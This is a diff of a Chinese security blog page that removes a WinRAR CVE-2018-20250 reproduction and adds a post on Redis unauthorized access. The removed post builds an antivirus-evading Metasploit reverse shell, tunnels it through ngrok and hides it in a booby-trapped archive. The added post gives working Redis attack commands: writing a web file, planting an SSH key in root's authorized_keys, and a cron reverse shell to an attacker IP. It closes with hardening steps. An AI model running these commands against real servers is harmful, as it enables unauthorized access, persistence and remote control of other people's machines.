@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="WinRAR,Metasploit,CVE,">
+  <meta name="keywords" content="Redis,">
 
 
 
@@ -79,29 +79,20 @@
 
 
 
-<meta name="description" content="一、前言WinRAR 代码执行相关的CVE 编号如下： 1CVE-2018-20250,CVE-2018-20251, CVE-2018-20252, CVE-2018-20253 这里我们复现最开始的WinRAR目录穿越漏洞（CVE-2018-20250）。 二、漏洞详情1. 原理WinRAR目录穿越漏洞（CVE-2018-20250）： ​    该漏洞是由于WinRAR 所使用的一个陈旧的动">
-<meta name="keywords" content="WinRAR,Metasploit,CVE">
+<meta name="description" content="一、Redis介绍Redis是一个开源的，基于ANSI C语言开发、支持网络、可基于内存亦可持久化的日志型的高性能的Key-Value数据库系统 二、漏洞原理 Redis未授权访问漏洞即Redis匿名访问漏洞，是由于 Redis服务本身的特性及其运维不当造成的。 Redis的默认配置文件中，会绑定 0.0.0.0:6379，这样 Redis会监听一切 IP，接收一切 IP的请求。如果没有采用添加防">
+<meta name="keywords" content="Redis">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CVE-2018-20250-WinRAR远程代码执行漏洞">
-<meta property="og:url" content="https://jeremyekek.github.io/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/index.html">
+<meta property="og:title" content="Redis未授权访问漏洞">
+<meta property="og:url" content="https://jeremyekek.github.io/2019/05/15/Redis未授权访问漏洞/index.html">
 <meta property="og:site_name" content="EkEk的个人博客">
-<meta property="og:description" content="一、前言WinRAR 代码执行相关的CVE 编号如下： 1CVE-2018-20250,CVE-2018-20251, CVE-2018-20252, CVE-2018-20253 这里我们复现最开始的WinRAR目录穿越漏洞（CVE-2018-20250）。 二、漏洞详情1. 原理WinRAR目录穿越漏洞（CVE-2018-20250）： ​    该漏洞是由于WinRAR 所使用的一个陈旧的动">
+<meta property="og:description" content="一、Redis介绍Redis是一个开源的，基于ANSI C语言开发、支持网络、可基于内存亦可持久化的日志型的高性能的Key-Value数据库系统 二、漏洞原理 Redis未授权访问漏洞即Redis匿名访问漏洞，是由于 Redis服务本身的特性及其运维不当造成的。 Redis的默认配置文件中，会绑定 0.0.0.0:6379，这样 Redis会监听一切 IP，接收一切 IP的请求。如果没有采用添加防">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://jeremyekek.github.io/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/1552705180118.png">
-<meta property="og:image" content="https://jeremyekek.github.io/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/343244.png">
-<meta property="og:image" content="https://jeremyekek.github.io/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/sfasfe.png">
-<meta property="og:image" content="https://jeremyekek.github.io/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/asd57h.png">
-<meta property="og:image" content="https://jeremyekek.github.io/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/sdasdf676.png">
-<meta property="og:image" content="https://jeremyekek.github.io/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/Y4HG8TCD3.png">
-<meta property="og:image" content="https://jeremyekek.github.io/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/saass.png">
-<meta property="og:image" content="https://jeremyekek.github.io/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/dfgjhjh456754.png">
-<meta property="og:image" content="https://jeremyekek.github.io/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/%$V6[%608.png">
-<meta property="og:image" content="https://jeremyekek.github.io/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/2B3X4XPAT0W.png">
-<meta property="og:updated_time" content="2019-05-01T08:35:27.860Z">
+<meta property="og:image" content="https://jeremyekek.github.io/2019/05/15/Redis未授权访问漏洞/1557925558674.png">
+<meta property="og:updated_time" content="2019-05-15T13:43:05.094Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="CVE-2018-20250-WinRAR远程代码执行漏洞">
-<meta name="twitter:description" content="一、前言WinRAR 代码执行相关的CVE 编号如下： 1CVE-2018-20250,CVE-2018-20251, CVE-2018-20252, CVE-2018-20253 这里我们复现最开始的WinRAR目录穿越漏洞（CVE-2018-20250）。 二、漏洞详情1. 原理WinRAR目录穿越漏洞（CVE-2018-20250）： ​    该漏洞是由于WinRAR 所使用的一个陈旧的动">
-<meta name="twitter:image" content="https://jeremyekek.github.io/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/1552705180118.png">
+<meta name="twitter:title" content="Redis未授权访问漏洞">
+<meta name="twitter:description" content="一、Redis介绍Redis是一个开源的，基于ANSI C语言开发、支持网络、可基于内存亦可持久化的日志型的高性能的Key-Value数据库系统 二、漏洞原理 Redis未授权访问漏洞即Redis匿名访问漏洞，是由于 Redis服务本身的特性及其运维不当造成的。 Redis的默认配置文件中，会绑定 0.0.0.0:6379，这样 Redis会监听一切 IP，接收一切 IP的请求。如果没有采用添加防">
+<meta name="twitter:image" content="https://jeremyekek.github.io/2019/05/15/Redis未授权访问漏洞/1557925558674.png">
 
 
 
@@ -131,13 +122,13 @@
 
 
 
-  <link rel="canonical" href="https://jeremyekek.github.io/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/">
+  <link rel="canonical" href="https://jeremyekek.github.io/2019/05/15/Redis未授权访问漏洞/">
 
 
 
 
 
-  <title>CVE-2018-20250-WinRAR远程代码执行漏洞 | EkEk的个人博客</title>
+  <title>Redis未授权访问漏洞 | EkEk的个人博客</title>
   
 
 
@@ -263,7 +254,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://jeremyekek.github.io/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/">
+    <link itemprop="mainEntityOfPage" href="https://jeremyekek.github.io/2019/05/15/Redis未授权访问漏洞/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="EkEk">
@@ -280,7 +271,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">CVE-2018-20250-WinRAR远程代码执行漏洞</h1>
+          <h1 class="post-title" itemprop="name headline">Redis未授权访问漏洞</h1>
         
 
         <div class="post-meta">
@@ -296,8 +287,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-05-01T16:35:27+08:00">
-                2019-05-01
+              <time title="更新于" itemprop="dateModified" datetime="2019-05-15T21:43:05+08:00">
+                2019-05-15
               </time>
             
           </span>
@@ -315,8 +306,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/漏洞复现/" itemprop="url" rel="index">
-                    <span itemprop="name">漏洞复现</span>
+                  <a href="/categories/技术文章/" itemprop="url" rel="index">
+                    <span itemprop="name">技术文章</span>
                   </a>
                 </span>
 
@@ -333,8 +324,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/" itemprop="commentCount"></span>
+                <a href="/2019/05/15/Redis未授权访问漏洞/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/05/15/Redis未授权访问漏洞/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -362,44 +353,57 @@
       
 
       
-        <h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>WinRAR 代码执行相关的CVE 编号如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2018-20250,CVE-2018-20251, CVE-2018-20252, CVE-2018-20253</span><br></pre></td></tr></table></figure>
-<p>这里我们复现最开始的WinRAR目录穿越漏洞（CVE-2018-20250）。</p>
-<h2 id="二、漏洞详情"><a href="#二、漏洞详情" class="headerlink" title="二、漏洞详情"></a>二、漏洞详情</h2><h3 id="1-原理"><a href="#1-原理" class="headerlink" title="1. 原理"></a>1. 原理</h3><p>WinRAR目录穿越漏洞（CVE-2018-20250）：</p>
-<p>​    该漏洞是由于WinRAR 所使用的一个陈旧的动态链接库UNACEV2.dll所造成的，该动态链接库在2006 年被编译，没有任何的基础保护机制(ASLR,DEP 等)。该动态链接库的作用是处理ACE 格式文件。而在解压处理过程中存在一处目录穿越漏洞,允许解压过程写入文件至开机启动项，导致代码执行。</p>
+        <h2 id="一、Redis介绍"><a href="#一、Redis介绍" class="headerlink" title="一、Redis介绍"></a>一、Redis介绍</h2><p><code>Redis</code>是一个开源的，基于<code>ANSI C语言</code>开发、支持网络、可基于内存亦可持久化的日志型的高性能的Key-Value数据库系统</p>
+<h2 id="二、漏洞原理"><a href="#二、漏洞原理" class="headerlink" title="二、漏洞原理"></a>二、漏洞原理</h2><p> Redis未授权访问漏洞即Redis匿名访问漏洞，是由于 <code>Redis</code>服务本身的特性及其运维不当造成的。</p>
+<p><code>Redis</code>的默认配置文件中，会绑定 <code>0.0.0.0:6379</code>，这样 <code>Redis</code>会监听一切 <code>IP</code>，接收一切 <code>IP</code>的请求。如果没有采用添加防火墙规则等安全策略屏蔽非信任来源 <code>IP</code>访问，就会使 <code>Redis</code>服务暴露在公网，被任意用户进行登录。</p>
+<p><code>Redis</code>默认没有设置密码认证，没有进行相应的密码验证会导致任意 用户免密登录 <code>Redis</code>，从而读取 <code>Redis</code>的数据、篡改 <code>Redis</code>的数据或者更高危的操作。</p>
 <a id="more"></a>
-<p><em>漏洞细节</em>: <a href="https://research.checkpoint.com/extracting-code-execution-from-winrar/" target="_blank" rel="noopener">https://research.checkpoint.com/extracting-code-execution-from-winrar/</a></p>
-<h3 id="2-影响版本"><a href="#2-影响版本" class="headerlink" title="2. 影响版本"></a>2. 影响版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WinRAR &lt; 5.70 Beta 1</span><br><span class="line">Bandizip &lt; = 6.2.0.0</span><br><span class="line">好压(2345压缩) &lt; = 5.9.8.10907</span><br><span class="line">360压缩 &lt; = 4.0.0.1170</span><br></pre></td></tr></table></figure>
-<h2 id="三、漏洞复现"><a href="#三、漏洞复现" class="headerlink" title="三、漏洞复现"></a>三、漏洞复现</h2><h3 id="1-准备"><a href="#1-准备" class="headerlink" title="1. 准备"></a>1. 准备</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">KaliLinux（2019.1)</span><br><span class="line">Metasploit(KaliLinux2019.1已经集成了Metasploit5)</span><br><span class="line">ngrok</span><br></pre></td></tr></table></figure>
-<h3 id="2-下载EXP"><a href="#2-下载EXP" class="headerlink" title="2. 下载EXP"></a>2. 下载EXP</h3><p><strong>下载WinRAR远程代码执行漏洞EXP利用文件:</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/WyAtu/CVE-2018-20250.git</span><br></pre></td></tr></table></figure>
-<p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/1552705180118.png" alt="1552705180118"></p>
-<h3 id="3-开启ngrok"><a href="#3-开启ngrok" class="headerlink" title="3. 开启ngrok"></a>3. 开启ngrok</h3><p>浏览器打开<a href="https://www.ngrok.com/" target="_blank" rel="noopener">https://www.ngrok.com/</a> 进行账号登录，开通一个免费的隧道转发代理。</p>
-<p>按照首页的步骤建立如下连接</p>
-<p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/343244.png" alt></p>
-<h3 id="4-生成Payload"><a href="#4-生成Payload" class="headerlink" title="4. 生成Payload"></a>4. 生成Payload</h3><p>Metasploit生成免杀Payload 载荷(针对Windows10的defender)</p>
-<p>使用Metasploit5自带的免杀模块生成Payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use evasion/windows/windows_defender_exe(选择msf5免杀模块)</span><br><span class="line">show info(显示模块信息)</span><br><span class="line">set filename WinRarPayloadTest.exe(设置Payload名字 )</span><br><span class="line">set payload windows/meterpreter/reverse_tcp(设置Payload类型 )</span><br><span class="line">set lhost tcp://0.tcp.ngrok.io(设置上线地址，填写Ngrok映射出去的地址即可)</span><br><span class="line">set lport 17814(设置监听端口，填写Ngrok映射出去的端口即可 )</span><br><span class="line">run(生成Payload)</span><br></pre></td></tr></table></figure>
-<p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/sfasfe.png" alt></p>
-<p>把Payload文件放到EXP文件夹下的根目录</p>
-<p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/asd57h.png" alt></p>
-<p>打开exp.py文件把“calc.exe“修改成”WinRarPayload.exe”保存</p>
-<p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/sdasdf676.png" alt></p>
-<p>Python运行exp.py文件自动在文件根目录下生成恶意压缩包。</p>
-<p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/Y4HG8TCD3.png" alt></p>
-<p>已经成功生成了恶意的压缩包，这时候可以往里面放一些引诱文件就变成了诱人的压缩包了。</p>
-<p>Windows7靶机下载解压这个恶意压缩包：</p>
-<p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/saass.png" alt></p>
-<p>解压后自动在系统启动目录下自动出现我们之前生成的Payload</p>
-<p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/dfgjhjh456754.png" alt></p>
-<p>Windows7系统启动目录:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span><br></pre></td></tr></table></figure>
-<p>Metasploit启动远程监听主机上线请求:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.10.20</span><br><span class="line">set lport 8878</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/%$V6[`8.png" alt></p>
-<p><img src="/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/2B3X4XPAT0W.png" alt></p>
-<p>确保ngrok后台在运行,然后重启Windows7靶机，metasploit监听等待上线</p>
-<h3 id="5-验证payload"><a href="#5-验证payload" class="headerlink" title="5. 验证payload"></a>5. 验证payload</h3><p>待更新</p>
+<h2 id="二、Redis安装"><a href="#二、Redis安装" class="headerlink" title="二、Redis安装"></a>二、Redis安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sudo apt-get update</span><br><span class="line">$sudo apt-get install redis-server</span><br></pre></td></tr></table></figure>
+<h2 id="二、Redis服务器配置"><a href="#二、Redis服务器配置" class="headerlink" title="二、Redis服务器配置"></a>二、Redis服务器配置</h2><p>修改配置文件 /opt/redis/redis.conf</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># bind 127.0.0.1	#监听任意ip</span><br><span class="line">protected-mode no	#关闭保护模式</span><br></pre></td></tr></table></figure>
+<p>启动redis</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server redis.conf 	#重新加载配置文件</span><br></pre></td></tr></table></figure>
+<h2 id="三、Redis客户端连接"><a href="#三、Redis客户端连接" class="headerlink" title="三、Redis客户端连接"></a>三、Redis客户端连接</h2><p>客户端（本地宿主机）连接redis服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.10.13</span><br></pre></td></tr></table></figure>
+<h2 id="四、基础命令"><a href="#四、基础命令" class="headerlink" title="四、基础命令"></a>四、基础命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">info		#版本信息，服务器信息等</span><br><span class="line">set name &quot;hi&quot;	#设置变量</span><br><span class="line">get name 	#取值</span><br><span class="line">flushall 	#删除数据库（一般情况下不要用！）</span><br><span class="line">keys * 		#查看所有的键</span><br><span class="line">CONFIG GET dir/dbfilename	#获取默认的Reids目录和rdb的文件名，在修改前先获取，然后走的时候再恢复</span><br><span class="line">CONFIG SET dir/dbfilename	#修改默认的Reids目录和rdb的文件名</span><br><span class="line">save	#执行同步保存操作，将当前Redis实例的所有数据快照(snapshot)以RDB文件的形式保存到硬盘。</span><br><span class="line">bgsave	#fork一个子进程来创建RDB文件，父进程可以继续处理命令请求。</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>注意：</p>
+<p>save：会阻塞redis服务器进程，直到创建RDB文件完毕为止；（在此期间进程不能处理任何请求）<br>bgsave：命令执行之后立即返回 OK ，然后Redis fork 出一个新子进程，原来的Redis 进程(父进程)继续处理客户端请求，而子进程则负责将数据保存到磁盘，然后退出</p>
+</blockquote>
+<h2 id="五、攻击利用方式"><a href="#五、攻击利用方式" class="headerlink" title="五、攻击利用方式"></a>五、攻击利用方式</h2><h3 id="1-写Webshell"><a href="#1-写Webshell" class="headerlink" title="1. 写Webshell"></a>1. 写Webshell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CONFIG SET dir /var/www/		#将rdb文件保存在/var/www/中</span><br><span class="line">CONFIG SET dbfilename redis.php	#将rdb文件名修改为redis.php</span><br><span class="line">set shell &quot;&lt;?php phpinfo();?&gt;&quot;	#往redis.php中写木马</span><br><span class="line">bgsave</span><br></pre></td></tr></table></figure>
+<h3 id="2-ssh配置免密登录"><a href="#2-ssh配置免密登录" class="headerlink" title="2. ssh配置免密登录"></a>2. ssh配置免密登录</h3><p>条件：</p>
+<ul>
+<li>Redis服务使用ROOT账号启动 </li>
+<li>服务器开放SSH服务，而且允许密钥登录，即可远程写入一个公钥，直接登录远程服务器</li>
+</ul>
+<p>先在渗透主机上生成 <code>ssh</code>的私钥与公钥：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa	//一直回车即可</span><br><span class="line">(echo -e &quot;\n\n&quot;;cat id_rsa.pub;echo -e &quot;\n\n&quot;) &gt; hack.txt	# 保存公钥到hack.txt中</span><br><span class="line">cat hack.txt | redis-cli -h 192.168.1.10 -p 6379 -x set hack # 把公钥写入到redis主机</span><br></pre></td></tr></table></figure>
+<p>登陆访问redis</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.10.13</span><br></pre></td></tr></table></figure>
+<p>修改RDB存储位置</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">bgsave</span><br></pre></td></tr></table></figure>
+<p>ssh远程连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa root@192.168.10.13</span><br></pre></td></tr></table></figure>
+<h3 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3. 反弹shell"></a>3. 反弹shell</h3><p>crontab周期性执行任务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">crontab </span><br><span class="line">-l	#查看当前任务</span><br><span class="line">-r	#删除任务</span><br><span class="line">-e	#编辑</span><br><span class="line">6部分：分钟 小时 天 月 星期 命令/脚本</span><br><span class="line">*/2 * * * * echo &quot;this is test&quot; &gt;&gt;/tmp/backup</span><br></pre></td></tr></table></figure>
+<p>查看当前任务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /var/spool/cron/</span><br><span class="line">ls</span><br><span class="line">cat root</span><br><span class="line">该文件内容等同于</span><br><span class="line">crontab -l</span><br></pre></td></tr></table></figure>
+<p>写入crontab定时任务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">set xx &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1\n&quot;</span><br><span class="line">bgsave</span><br></pre></td></tr></table></figure>
+<p>攻击者服务端开启监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vlnp 7999</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/05/15/Redis未授权访问漏洞/1557925558674.png" alt="1557925558674"></p>
+<h2 id="六、修复"><a href="#六、修复" class="headerlink" title="六、修复"></a>六、修复</h2><h4 id="低权限运行Redis服务"><a href="#低权限运行Redis服务" class="headerlink" title="低权限运行Redis服务"></a>低权限运行Redis服务</h4><p>避免使用<code>root</code>用户身份启动<code>Redis</code>服务，选择权限较低的用户运行<code>rides</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupadd -r redis &amp;&amp; useradd -r -g redis redis</span><br></pre></td></tr></table></figure>
+<h4 id="禁止命令"><a href="#禁止命令" class="headerlink" title="禁止命令"></a>禁止命令</h4><p>通过修改配置文件来禁止一些高风险的命令。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vim redis.conf</span><br><span class="line">...</span><br><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">rename-command CONFIG   &quot;&quot;</span><br><span class="line">rename-command EVAL     &quot;&quot;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<h4 id="添加密码认证"><a href="#添加密码认证" class="headerlink" title="添加密码认证"></a>添加密码认证</h4><p>通过配置文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim redis.conf</span><br><span class="line">requirepass PASSWORD</span><br></pre></td></tr></table></figure>
+<p>也可以通过 <code>Redis</code>的命令行：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; config set requirepass PASSWORD</span><br></pre></td></tr></table></figure>
+<h4 id="禁止外网访问"><a href="#禁止外网访问" class="headerlink" title="禁止外网访问"></a>禁止外网访问</h4><p>通过防火墙等配置来禁止外网访问。</p>
+<h2 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h2><p><code>Redis</code>匿名访问漏洞由不安全的运维配置引起的，作为配置 <code>Redis</code>的开发人员或运维人员一定要有一定的安全意识，才能更好的实现真正的安全。</p>
+<h2 id="八、参考文章："><a href="#八、参考文章：" class="headerlink" title="八、参考文章："></a>八、参考文章：</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&amp;mid=2247486083&amp;idx=1&amp;sn=666450400463d4e5859dc5cc44e1c125&amp;chksm=fbf790f3cc8019e5cf5bc18d9613cdf753843ff168287aa02a7ffbbf10b1de14adda5014efd3&amp;mpshare=1&amp;scene=1&amp;srcid=0515suowq2IQTtgTS6p7CQYB&amp;key=6d5a213b9d007c25d3d2231d6bd6b4201c5288fd64eedafa935ba639a2fa4d47aeee0e6b412b4bf9d5bfa0b2a643faab2c1a323181f0b350c9abc93031a416d1ec1ba77485db2a58ba65a9d010cb0aa2&amp;ascene=1&amp;uin=MTU1MTA3MzA3OQ%3D%3D&amp;devicetype=Windows+10&amp;version=62060739&amp;lang=zh_CN&amp;pass_ticket=i1OV73MX6FUakKhfB6AFSufopQjomZv%2FYeYRGSAQ3oprOhX%2BLJdD5rJJCyLpPXYG" target="_blank" rel="noopener">Redis匿名访问漏洞</a></p>
 
       
     </div>
@@ -420,7 +424,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://jeremyekek.github.io/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/" title="CVE-2018-20250-WinRAR远程代码执行漏洞">https://jeremyekek.github.io/2019/03/16/CVE-2018-20250-WinRAR远程代码执行漏洞/</a>
+    <a href="https://jeremyekek.github.io/2019/05/15/Redis未授权访问漏洞/" title="Redis未授权访问漏洞">https://jeremyekek.github.io/2019/05/15/Redis未授权访问漏洞/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -435,11 +439,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/WinRAR/" rel="tag"># WinRAR</a>
-          
-            <a href="/tags/Metasploit/" rel="tag"># Metasploit</a>
-          
-            <a href="/tags/CVE/" rel="tag"># CVE</a>
+            <a href="/tags/Redis/" rel="tag"># Redis</a>
           
         </div>
       
@@ -452,8 +452,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/03/14/Metasploit-MSF/" rel="next" title="Metasploit(MSF)入门">
-                <i class="fa fa-chevron-left"></i> Metasploit(MSF)入门
+              <a href="/2019/05/01/CVE-2014-0160-心脏滴血漏洞/" rel="next" title="CVE-2014-0160-心脏滴血漏洞">
+                <i class="fa fa-chevron-left"></i> CVE-2014-0160-心脏滴血漏洞
               </a>
             
           </div>
@@ -461,10 +461,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/03/16/nmap基础命令/" rel="prev" title="nmap基础命令">
-                nmap基础命令 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -760,7 +756,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#一、前言"><span class="nav-number">1.</span> <span class="nav-text">一、前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#二、漏洞详情"><span class="nav-number">2.</span> <span class="nav-text">二、漏洞详情</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-原理"><span class="nav-number">2.1.</span> <span class="nav-text">1. 原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-影响版本"><span class="nav-number">2.2.</span> <span class="nav-text">2. 影响版本</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#三、漏洞复现"><span class="nav-number">3.</span> <span class="nav-text">三、漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-准备"><span class="nav-number">3.1.</span> <span class="nav-text">1. 准备</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-下载EXP"><span class="nav-number">3.2.</span> <span class="nav-text">2. 下载EXP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-开启ngrok"><span class="nav-number">3.3.</span> <span class="nav-text">3. 开启ngrok</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-生成Payload"><span class="nav-number">3.4.</span> <span class="nav-text">4. 生成Payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-验证payload"><span class="nav-number">3.5.</span> <span class="nav-text">5. 验证payload</span></a></li></ol></li></ol></div>
